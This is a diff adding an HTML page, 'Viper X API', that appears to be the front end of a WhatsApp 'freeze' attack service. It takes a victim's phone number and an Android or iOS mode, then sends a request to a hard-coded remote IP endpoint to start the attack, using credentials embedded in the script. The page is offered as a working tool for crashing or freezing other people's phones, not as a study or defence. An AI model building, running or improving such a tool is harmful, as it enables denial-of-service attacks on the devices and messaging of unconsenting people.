@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Viper X API</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #2e026d, #6c1cdb);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 2rem;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
+      padding: 2.5rem 2rem;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 0.5rem;
+      letter-spacing: 1px;
+    }
+
+    h2 {
+      font-weight: 400;
+      font-size: 1rem;
+      margin-bottom: 2rem;
+      opacity: 0.9;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 0.75rem;
+      margin: 0.6rem 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      outline: none;
+    }
+
+    input, select {
+      background: rgba(255, 255, 255, 0.1);
+      color: #fff;
+    }
+
+    button {
+      background-color: #ffffff;
+      color: #2e026d;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #d1cfff;
+    }
+
+    .result {
+      margin-top: 1.5rem;
+      font-size: 0.95rem;
+      opacity: 0.9;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Viper X API</h1>
+    <h2>Execute Freeze Request via Gabimaru Core</h2>
+
+    <form id="apiForm">
+      <input type="text" id="numberInput" placeholder="Enter WhatsApp Number (e.g., 234xxxxxxxxxx)" required />
+      <select id="modeSelect" required>
+        <option value="">Select Mode</option>
+        <option value="andros">Android Freeze</option>
+        <option value="ios">iOS Freeze</option>
+      </select>
+      <button type="submit">Execute</button>
+    </form>
+
+    <div class="result" id="resultBox"></div>
+  </div>
+
+  <script>
+    const username = "gabi";
+    const key = "Y59J";
+
+    const form = document.getElementById('apiForm');
+    const resultBox = document.getElementById('resultBox');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const target = document.getElementById('numberInput').value.trim();
+      const mode = document.getElementById('modeSelect').value;
+
+      if (!target || !mode) {
+        resultBox.textContent = "⚠️ Please fill in all fields.";
+        return;
+      }
+
+      const url = `http://159.223.50.150:2000/execution?target=${target}&mode=${mode}&username=${username}&key=${key}`;
+      resultBox.textContent = "⏳ Sending request...";
+
+      try {
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (data?.status === 200 && data?.success) {
+          resultBox.textContent = `✅ Success: ${data.message || 'Execution started.'}\n Powered by Kunle`;
+        } else {
+          resultBox.textContent = `❌ Failed: ${data.message || 'Unknown error.'}`;
+        }
+      } catch (err) {
+        console.error(err);
+        resultBox.textContent = "❌ Error sending request. Please try again later.";
+      }
+    });
+  </script>
+</body>
+</html>
